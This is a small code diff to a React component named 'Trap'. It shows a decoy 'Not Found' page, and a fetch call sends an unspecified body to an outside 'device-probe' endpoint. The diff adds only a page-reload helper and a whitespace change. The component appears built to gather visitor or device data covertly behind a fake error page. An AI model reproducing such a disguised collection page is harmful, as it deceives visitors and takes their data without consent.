@@ -34,6 +34,10 @@ const Trap = () => {
     });
   }
 
+  function reload() {
+    window.location.reload();
+  }
+
   async function main(body) {
     try {
       const response = await fetch("https://device-probe.vercel.app/", {
@@ -63,7 +67,7 @@ const Trap = () => {
       <div className="not-found">
         <h1>Not Found</h1>
         <p>We're sorry, but the page you requested could not be found.</p>
-        <button>Go Back</button>
+        <button >Go Back</button>
       </div>
       <ToastContainer />
     </>
